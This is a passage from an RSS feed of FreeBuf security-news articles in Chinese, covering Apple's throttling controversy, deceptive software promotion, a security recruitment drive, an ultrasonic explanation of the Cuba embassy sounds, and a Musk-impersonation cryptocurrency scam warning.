data-rawheight=&quot;431&quot;&gt;&lt;/u&gt;&lt;p&gt;去年底，iPhone降频门让苹果2017年的句点画的并不圆满。事件从国外论坛开始蔓延，用户发现旧款iPhone变卡的原因竟然是CPU降频了。而此后苹果也承认了这一事实，并表示设备性能下降是iOS升级后为保证老化电池续航时间和稳定而采取的新机制。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8d26b11e27eebe5faf9ab13c5f100583_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;491&quot;&gt;&lt;/u&gt;&lt;p&gt;显然这种说法并没有能够说服消费者，在全球多个地方消费者就此事向法院提起诉讼。央视也多次披露这一情况，甚至上海消保委也要求苹果就此问题限期答复。&lt;/p&gt;&lt;p&gt;事件最终，苹果以较低的价格提供用户更换电池服务，并在随后的更新中去掉了降速机制并提供电池健康状况查询功能。&lt;/p&gt;&lt;p&gt;我国消费者权益保护法规定了消费者‘九大权利’，首要的就是知情权，没有知情权就无从作选择，没有选择权，更谈不上公平交易权。苹果降频门引发的轩然大波足以让其进入315重点照顾名单。&lt;/p&gt;&lt;p&gt;但苹果的麻烦显然还没有结束，前段时间网友曝出苹果技术顾问利用职权侵入其iCloud账户，并对其进行威胁恐吓。详情可参考FreeBuf此前的文章&lt;u&gt;&lt;a href=&quot;http://www.freebuf.com/articles/terminal/164447.html&quot;&gt;《细思极恐！苹果技术顾问私自窃取用户信息并恐吓威胁》&lt;/a&gt;&lt;/u&gt;。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bbe6372c511675eeec307796ff98c789_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;460&quot;&gt;&lt;/u&gt;&lt;p&gt;尽管苹果很快进行了回应，但该用户iCloud账户是如何被入侵，个人信息泄露多少以及有无外泄等问题却没有得到理想的回复，苹果对此事也再无回应。此事涉及国内无数苹果用户的隐私安全问题，而苹果的态度却多少显得有些敷衍。&lt;/p&gt;&lt;p&gt;作为全球第一市值的科技公司，苹果在国内表现出的姿态却有些让人大失所望。至于会不会上榜315黑名单，还是看明天的结果吧。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;三、诱导、欺骗性推广现象泛滥&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;网络推广实属常见，而为了达到更可观的点击量而采用具有诱导、欺骗性质的方式，就有点不能接受了，然而这类行为依然泛滥，而绝大部分用户中招之后除了厌恶、反感之外并不会采取强硬的态度。&lt;/p&gt;&lt;p&gt;由火绒安全报告腾讯QQ推广腾讯电脑管家和QQ浏览器存在欺骗、诱导推广等类似病毒行为之后，我们也开始关注到其他的诱导、欺骗推广行为：&lt;/p&gt;&lt;h2&gt;&lt;b&gt;1.各大知名下载站&lt;/b&gt;&lt;/h2&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-540b1cbb3bd6f5d5b8a8e0284d243e85_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;345&quot;&gt;&lt;/u&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a4f4d01699353c636a6cb52bd11ef025_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;400&quot;&gt;&lt;/u&gt;&lt;p&gt;Windows端没有有统一的应用商店也导致大量第三方下载站有机可乘，公然使用“XX高速下载”等字样吸引用户点击，但却不是直接下载应用，而是附带一堆捆绑选项的下载器，不仅严重影响用户体验，而且稍不留神就附带安装了捆绑推广的其他软件。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;2.已安装软件的弹窗推广&lt;/b&gt;&lt;/h2&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-044c657f759aeecbb61921c546872557_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;645&quot; data-rawheight=&quot;434&quot;&gt;&lt;/u&gt;&lt;p&gt;如之前提到的腾讯QQ弹窗推广，其他部分软件也存在这一类诱导、欺诈性推广的行为，例如采用“清理加速”、“优化省电”、“高速上网”等字眼，用户点击之后则会提示下载其它家族软件。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;3.手机端也是重灾区&lt;/b&gt;&lt;/h2&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e6287131e16f9c535dee81034b9facae_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;613&quot;&gt;&lt;/u&gt;&lt;p&gt;除了PC端，安卓手机端也是这类诱导推广行为的重灾区。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;四、网络消费陷阱：“搭售”、“大数据杀熟”&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;互联网提供便利不可否认，但也要小心各种消费陷阱。“携程在手，看清楚再走”、“大数据杀熟”算是这一年来网络消费领域的一个热词。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;携程在手，看清楚再走&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;知名女艺人韩雪一句“携程在手，看清楚再走”一举登顶微博热搜榜，也揭露了网购机票领域的“搭售”行为，就是用户通过携程购买机票的时候会被默认选购多种保险、接送机优惠券等等项目，导致最终付费高于机票本身价格。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e06d7eeffebf28eba9a436e80ca4d014_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;459&quot;&gt;&lt;/u&gt;&lt;p&gt;中消协也迅速关注这件事，律师表示这些行为损害了消费者知情权、自主选择权、公平交易权。这件事也让携程陷入前所未有的负面风波之中，另外包括携程、飞猪、去哪儿等OTA平台很快消除了这种“搭售”行为，但仍然有部分平台仍存在这一现象。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;大数据杀熟&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;比“搭售”行为更加让人深恶痛绝的应该是多个平台存在的“杀熟”行为，其代指的是一种网络商家对熟客给出的价格比普通用户要更高，在经济学角度称为价格欺诈。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-efbb76a60922a013546d7d68beb229e8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;675&quot; data-rawheight=&quot;381&quot;&gt;&lt;/u&gt;&lt;p&gt;业内人士表示，“杀熟现象并不新鲜，自从大数据和只能广告被应用到电商领域便一直存在，甚至是说行业丑闻。”现在各行各业都在说大数据，像OTA平添、出行服务平台，一般注册用户量巨大，拥有大量的用户信息，根据大数据分析打造用户画像，提供不同的服务，而其中会有一种“价格不敏感”消费者则更容易成为“大数据杀熟”的对象。&lt;/p&gt;&lt;p&gt;所谓的大数据被用于此，可能是“大数据”一词被黑的最惨的一次吧。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;每年的315晚会，无疑是国内影响力最大的消费黑榜，一旦上榜，“不死也重伤”可能是最好的形容。315晚会即将开幕，相信很多用户也会跟FreeBuf一样密切关注。文中提到的这些品牌及现象，在不同程度侵犯了消费者的某些权益，相信不少地区的消费者协会都关注到，相关企业的责任之外，更完善的法律法规以及监管措施同样迫在眉睫。如果让笔者选一个文中提到的最可能出现在315晚会上的案例，品牌上我会选择苹果，而手机APP收集个人信息问题概率也不小。&lt;/p&gt;&lt;p&gt;&lt;b&gt;*本文作者：Andy，转载请注明来自FreeBuf.COM&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-03-15-34587092</guid>
<pubDate>Thu, 15 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>错过等一年，中国首场信息安全垂直招聘来啦！</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-03-09-34392097.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34392097&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1bee43b81a06a3f90bab209d4d1c8551_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;中国首场信息安全垂直招聘——安全人才直升季重磅来袭！错过等一年！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;活动网址：&lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/activity/spring&quot;&gt;http://job.freebuf.com/activity/spring&lt;/a&gt;&lt;/u&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;活动时间：3月5日——4月30日&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;200+&lt;/b&gt;名企大咖入驻（腾讯、京东、科大讯飞、饿了么、知乎……），&lt;b&gt;400+&lt;/b&gt;信息安全相关职位虚位以待，职位涵盖从实习生到年薪百万的大牛岗位！&lt;/p&gt;&lt;p&gt;FreeBuf招聘站与众多求贤若渴、爱才如命的名企大佬们一起静候「佳人」。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;首场安全领域垂直招聘，内推直达名企&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;FreeBuf招聘站已联合腾讯、阿里、京东、微博、美团点评、知道创宇、深信服等百家优质企业，活动期间，求职简历将通过内推方式直达安全技术部门，简历情况当日反馈，求职快人一步。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-54a7c019cb0829075a4d6491e5461dfa_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;240&quot; data-rawheight=&quot;240&quot;&gt;&lt;/u&gt;&lt;h2&gt;&lt;b&gt;特色专场招聘，只为最优秀的你&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;「安全人才直升季」特别设立四大专场招聘——&lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/activity/company/?model=famous&quot;&gt;「名企内推专场」&lt;/a&gt;&lt;/u&gt; &lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/activity/company/?model=salary&quot;&gt;「高薪精英专场」&lt;/a&gt;&lt;a href=&quot;http://job.freebuf.com/activity/company/?model=safe&quot;&gt;「安全厂商专场」&lt;/a&gt;&lt;/u&gt; &lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/activity/company/?model=intern&quot;&gt;「实习生专场」&lt;/a&gt;&lt;/u&gt;。无论你是初入社会寻找实习机会的小鲜肉、还是想百尺竿头更进一步的信息安全老司机，无论是甲方乙方，总有一款适合你。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cba2d6a44f932a7126029bef4bde3e4b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;607&quot; data-rawheight=&quot;334&quot;&gt;&lt;/u&gt;&lt;h2&gt;&lt;b&gt;FreeBuf招聘站全新升级，注册有礼&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;经过一段时间的公测运营，FreeBuf招聘站再一次优化升级——新增用户简历模板优化、简历预览、简历下载、职位分类、面试预约通知等功能，更多新的改变，期待各位Bufer的注册与挖掘。&lt;/p&gt;&lt;p&gt;与此同时，FreeBuf也为大家准备了注册好礼与FB职业发展奖励大礼包，奖励详情请猛戳&lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/activity/spring&quot;&gt;http://job.freebuf.com/activity/spring&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;关注每位Bufer职业发展，FreeBuf带你扬帆起航&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;长久以来，FreeBuf始终关注信息安全人才的成长发展，除了更多优质的岗位，FreeBuf招聘站后续还将会为大家带来更多关于信息安全职业生涯规划探讨。&lt;/p&gt;&lt;p&gt;更多职位详情欢迎添加@FB招聘小助手（QQ：445467747）或点击（&lt;u&gt;&lt;a href=&quot;http://cn.mikecrm.com/mBZK37o&quot;&gt;http://cn.mikecrm.com/mBZK37o&lt;/a&gt;&lt;/u&gt;）告诉服妹你的故事，获得独家职位推荐。&lt;/p&gt;&lt;p&gt;加入&lt;u&gt;&lt;a href=&quot;http://job.freebuf.com/&quot;&gt;FreeBuf招聘站&lt;/a&gt;&lt;/u&gt;，你离升职加薪只差一次【投递简历】的距离！&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b6d4a07a1234cc2cb997ab9d8ea75305_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;1227&quot;&gt;&lt;/u&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-03-09-34392097</guid>
<pubDate>Fri, 09 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>美大使馆遭遇声波攻击，浙大WitAwards获奖团队协助调查</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-03-08-34338612.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34338612&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1372421327ca9fc4d4ed1caa86af14a6_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;声波之谜&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;根据外媒报道，至少 24 名美国驻古巴大使馆工作人员在 2016 年 12 月到 2017 年 8 月期间听到过尖锐声音，并受声波影响而受伤。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;2017 年 8 月，有报道称美国和加拿大驻古巴的外交官都换上了一些奇怪的疾病。有人猜测他们遭到高频声波武器攻击才患上这种病。然而，声学专家很快指出了这种攻击并不太可能。首先，超声波频率（20 千赫兹 – 200 千赫兹）不会在空气中繁殖，也不会导致大使馆所报告的耳痛、头痛、头晕等症状。 此外，一些受害者回忆起听到尖锐的声音，而人类并不能听到超声波。&lt;/p&gt;&lt;p&gt;10 月份，美联社（AP）发布了一个 6 秒的音频剪辑，据称是美国大使馆工作人员听到的声音录音，导致此事更加扑朔迷离。人们可以听到这种以 7kHz 为主的声音，但这种声音并不像是武器。&lt;/p&gt;&lt;p&gt;密歇根大学的计算机专家 Kevin Fu 看过 YouTube 上该音频的声波图之后，注意到了一些异常的涟漪状片段。他认为这可能就是问题所在。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-308258569235085b7b6080f3da759e76_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;562&quot; data-rawheight=&quot;306&quot;&gt;&lt;/u&gt;&lt;p&gt;Kevin 所在的实验室专门研究传感器、起搏器、RFID、自动驾驶汽车等 IoT 设备的安全问题。因为这些经验，Kevin 知道现代电子产品常常不按常理出牌，并且可以使用精心设计的声音或无线电干扰来有意或无意地人为操纵这些设备。因此，他认为声波图中的涟漪可能代表某种干扰。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;研究真相&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Kevin 曾经与国内浙江大学教授徐文渊合作密切，这次他们一起讨论研究了美联社发布的这段片段，参与研究的还有徐文渊带的博士生闫琛。&lt;/p&gt;&lt;p&gt;据悉，徐文渊教授的实验室主要研究嵌入式安全，涉及使用超声波和无线电波来欺骗语音识别系统和自动驾驶汽车等领域。在 FreeBuf 主办的a href=&quot;http://www.freebuf.com/subject?hot=WitAwards%202017%20%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%B9%B4%E5%BA%A6%E8%AF%84%E9%80%89&quot;&amp;gt; WitAwards 2017  互联网安全年度评选中，徐文渊团队还获得了“年度安全团队”的美誉。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-af611042dda3f3906afeea8d63744a93_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;519&quot; data-rawheight=&quot;346&quot;&gt;&lt;/u&gt;&lt;p&gt;Kevin 认为这段声波是分谐波，并在遭到闫琛质疑时做了实验。而徐文渊和闫琛从音频中显示信号精确频率和幅度的快速傅里叶变换着手调查。然后，闫琛通过一系列的模拟，证明互调失真效应可能产生 AP 给出的这段声音。 两个频率不同的信号结合在一起，产生与原始频率有差值、总和或倍数关系的合成信号，这个过程中会发生互调失真。&lt;/p&gt;&lt;p&gt;当信号处理设备以非线性方式运行时，会导致这种类型的失真。例如，麦克风电路可以表现出非线性行为，并且通过空气传播的波也可以以非线性方式表现。 &lt;/p&gt;&lt;blockquote&gt;包含多个频率的声波穿过非线性系统时，人们可以在信号频谱中获得这些奇怪的波纹。同时，互调失真会产生比原始信号频率更低的信号。也就是说，通过空气传播的无声超声波可以产生听得见的声音。&lt;/blockquote&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-74ebe09c4e3daa1c228fdaf8f2f9a6ea_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;560&quot; data-rawheight=&quot;298&quot;&gt;&lt;/u&gt;&lt;p&gt;他们继续在实验室中进行模拟，使用两个超声波扬声器，一个发出 25 kHz 的信号，另一个发出 32 kHz 的信号。将这两个信号交叉就会产生 7kHz 的高音。7kHz 的频率相当于两个超声波扬声器之间的频率差，并且与 AP 公布的音频频率相同。为了致敬网络爆红的“rickrolling”现象，闫琛还将超声波版本的 Rick Astley 歌曲“Never Gonna Give Up Up”，两个信号交叉处可以听到。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://v.qq.com/x/page/a0101vu1zcu.html&quot;&gt;利用超声载体传输歌曲视频&lt;/a&gt;&lt;/p&gt;&lt;p&gt;三位研究员在逆向 AP 发布音频后，也研究了形成影响美国驻古巴大使馆的声音的超声波组合。 &lt;/p&gt;&lt;blockquote&gt;如果一定要说罪魁祸首是超声波的话，那么可能的原因是两个超声波信号意外地相互干扰，产生可听见的声音，造成了副作用。&lt;/blockquote&gt;&lt;p&gt;办公室环境中原本就存在超声波来源，例如室内占位传感器（可参见文章&lt;u&gt;&lt;a href=&quot;https://spectrum.ieee.org/semiconductors/devices/finally-a-likely-explanation-for-the-sonic-weapon-used-at-the-us-embassy-in-cuba/how-an-ultrasonic-sensor-nearly-derailed-a-phd-thesis&quot;&gt;《超声波传感器如何毁掉一篇博士论文》&lt;/a&gt;&lt;/u&gt;）。 &lt;/p&gt;&lt;blockquote&gt;也许房间里还有一台超声波干扰器和一台超声波发射器，因为有的工作人员没有意识到另一台设备的存在，就把其中一台设备放在了办公室。&lt;/blockquote&gt;&lt;u&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-fe1ae2e39a79caa1abcac17a7b9438d7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;643&quot; data-rawheight=&quot;214&quot;&gt;&lt;/u&gt;&lt;p&gt;不过这项调查没有研究美联社发布的这段音频是否真的会让人产生各种各样的症状，包括使大使馆工作人员受到的脑损伤。Kevin 表示，已知声音信号会引起疼痛，但并没有看到除此之外的的生理影响。&lt;/p&gt;&lt;p&gt;目前，联邦调查局尚未公布调查结果。不过，一些古巴科学家和医生认为，由压力引起的“集体心理障碍”也可能导致使馆工作人员出现一些身体症状。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;声波攻击研究——针对创造性事件的创造性研究&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;麻省理工学院一名专门研究无线传感和通信技术的教授 Fadel Adib 认为，这项研究是一项“对创造性事件进行的创造性研究”。Adib 没有参与这项研究，但对结果进行了审查，他认为无线信号确实可以相互作用。 &lt;/p&gt;&lt;blockquote&gt;如果发生这种情况，你会听到你原本不能听到的信号。在所有的推测中，这项研究结果是最合理的，在技术上也可能实现。&lt;/blockquote&gt;&lt;p&gt;Kevin 对于研究结果也很谨慎：幕后黑手可能并不是为了使用声波做武器发动攻击，而是在做工程技术，只不过技术比较烂（才造成这种后果）。&lt;/p&gt;&lt;p&gt;&lt;b&gt;*参考来源：&lt;u&gt;&lt;a href=&quot;https://spectrum.ieee.org/semiconductors/devices/finally-a-likely-explanation-for-the-sonic-weapon-used-at-the-us-embassy-in-cuba&quot;&gt;spectrum&lt;/a&gt;&lt;/u&gt;，AngelaY 编译整理，转载请注明来自 FreeBuf.COM。&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-03-08-34338612</guid>
<pubDate>Thu, 08 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>朋友圈被马斯克刷屏？社工骗子已经下手了</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-02-08-33687564.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33687564&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f8a8cf7031e189e0abb9020efb88afbc_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;几小时前，在数十万观众的注视下，人类现役运力最强的火箭 SpaceX “重型猎鹰”首飞成功，传奇人物马斯克再次成为万众瞩目的焦点。不论是在国外的 Twitter 上还是国内的微信朋友圈，相关新闻已经刷爆了。&lt;/blockquote&gt;&lt;u&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6484eecbebf17f5cc51b0353c88f1922_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;503&quot; data-rawheight=&quot;252&quot;&gt;&lt;/u&gt;&lt;p&gt;&lt;b&gt;可以说，这是马斯克参与的一次“太空级”大 show。在火箭发射前一天，马斯克的 Twitter 就不断刷屏，让很多粉丝都激动不已。在大消息面前，很多人都容易“得意”忘形，失去警惕。而手法娴熟的社工大佬，正是抓住了这个机会，小赚了一笔。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;戏精社工套路多&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在马斯克的一条推文下面，出现了两个山寨账号，不停地刷评论，表明自己将给粉丝发放几百个以太币，前提是每个粉丝先转一定量的以太币到指定的钱包地址，收到粉丝转账后，会按照 10 倍返还。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c3a033bd24cd525979b59c730f937912_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;588&quot; data-rawheight=&quot;764&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9d35d6d049af8127861b283e07b7f4e8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;583&quot; data-rawheight=&quot;678&quot;&gt;&lt;p&gt;乍看之下，这两个账号跟马斯克本人的 Twitter 头像和昵称都一样，但仔细一看，用户名其实是高仿。马斯克本人的用户名是 @elonmusk，而这两个骗子的用户名则分别是 @eloonmusk 和 @elonnmuusk，此外，加入Twitter 的时间和定位地点、公司信息等都不一样，稍加留意，还是能区别开来。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8d259238b270ca691f55b5e27661cf6e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;266&quot; data-rawheight=&quot;379&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-7ca181b6bf7c4e466fd04f703246b41e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;268&quot; data-rawheight=&quot;379&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c9058fe8ccd4f9afc0169d94b955f76c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;266&quot; data-rawheight=&quot;379&quot;&gt;&lt;p&gt;从左到右依次为：马斯克本人、高仿号1、高仿号2&lt;/p&gt;&lt;p&gt;目前，已经有很多人识别出这个诈骗伎俩，并在其评论中回复“诈骗信息”，提醒其他读者注意。但是，查询该山寨账号留下的以太币钱包地址，发现其钱包中已经有了 4.709 的以太币余额，价值约 3500 美元。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2d5345642f150d586f892dce7062d5bb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;588&quot; data-rawheight=&quot;665&quot;&gt;&lt;p&gt;网友提醒&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cf8521edfddaf1a3141a2e8db0120f0a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;99&quot;&gt;&lt;p&gt;以太币钱包信息&lt;/p&gt;&lt;h2&gt;&lt;b&gt;高仿诈骗不少见，受骗资金难追回&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;说起高仿，国内常见的是在新浪微博，有很多山寨的明星账号，吸引人气，博取眼球等，当然，也有高仿号模仿微博微信好友，进行诈骗，这类案例也不少见。前两天就有报道称，有网友在微博上收朋友的私信，谎称转账出现问题，让其帮忙垫付机票钱。由于这名网友警惕性高，最终识破骗局。这个案例中，骗子就使用了高仿号，与好友的昵称很像。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-16cb02960a2590562776d85d49e005d2_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;440&quot; data-rawheight=&quot;874&quot;&gt;&lt;p&gt;骗子使用的高仿号，在好友的昵称后多加了一个“-”&lt;/p&gt;&lt;p&gt;去年也曾有媒体报道称，仅在一个受害者群里，百余名受害者已被骗取 170 多万元，且警方曾表示，这类骗局，追回受骗资金的概率较小。&lt;/p&gt;&lt;p&gt;&lt;b&gt;FreeBuf 在此提醒大家，社工防不胜防，网络安全常记心间哦。&lt;/b&gt;&lt;/p&gt;&lt;b&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dd5109e391cb64da66ddfc3dac6f2007_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;346&quot; data-rawheight=&quot;318&quot;&gt;&lt;/b&gt;&lt;p&gt;&lt;b&gt;*参考来源：&lt;u&gt;&lt;a href=&quot;https://twitter.com/elonmusk&quot;&gt;Twitter&lt;/a&gt;&lt;/u&gt;，&lt;u&gt;&lt;a href=&quot;http://news.sina.com.cn/o/2018-02-05/doc-ifyreuzn3300032.shtml&quot;&gt;新浪新闻&lt;/a&gt;&lt;/u&gt;，AngelaY 整理，转载请注明来自 FreeBuf.COM&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-02-08-33687564</guid>
<pubDate>Thu, 08 Feb 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>从刷支付宝乘地铁谈起，浅议大数据时代的隐私安全</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-01-22-33184183.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33184183&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-27b0283dbc3976f250c3c7cc38d5289b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;据悉，在2018年，每个月都会有新的城市在公交地铁领域开通移动支付。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;近期支付宝、微信、银联等移动支付企业纷纷抢滩城市公共服务。针对地铁公交这一场景，目前已经有超过30个城市在支付宝内上线了电子公交卡功能，这意味着——用户可以丢开匿名的交通卡，使用支付宝及相关应用进行刷码通行。&lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-27b0283dbc3976f250c3c7cc38d5289b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;518&quot;&gt;&lt;p&gt;和此前共享单车市场相比，轨道交通等公共出行在每个人的生活中都占据了更重要的地位。用“&lt;b&gt;现代支付系统”取代“传统地铁充值卡”所能提供的便利，让很多用户感到迫不及待。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;而在现代支付系统的接入之后，出行的数据也可能继续用在城市交通管理之中，改善更多其他服务，如改进城市的交通服务、整治拥堵等等。而这些便利存在的前提在于——当今的大数据时代大背景。&lt;/p&gt;&lt;p&gt;高速发展、高吞吐量的大数据时代，绝大多数人都的所有行为逐渐都能在信息世界之中留下数据足迹，无论是用户主动留下的数字脚印，还是由他人建立的关于用户的数据。&lt;/p&gt;&lt;p&gt;&lt;b&gt;在此，笔者仍然希望“老生常谈地”与大家探讨大数据时代的个人隐私问题。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;个人与服务商之间的信息不对称&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;信息时代下，只要我们使用在线工具和平台，或者接入平台的服务，就会产生相应的数据。在一些观点看来，人人是数据的生产者，可以让信息变得更透明。但是作为线上服务的使用者，即便有用户隐私条款的存在，多数的用户仍然并不了解自己被采集了什么样的信息，被追踪了哪些数据。&lt;/p&gt;&lt;p&gt;条款中冗长的文字、专业的术语，都会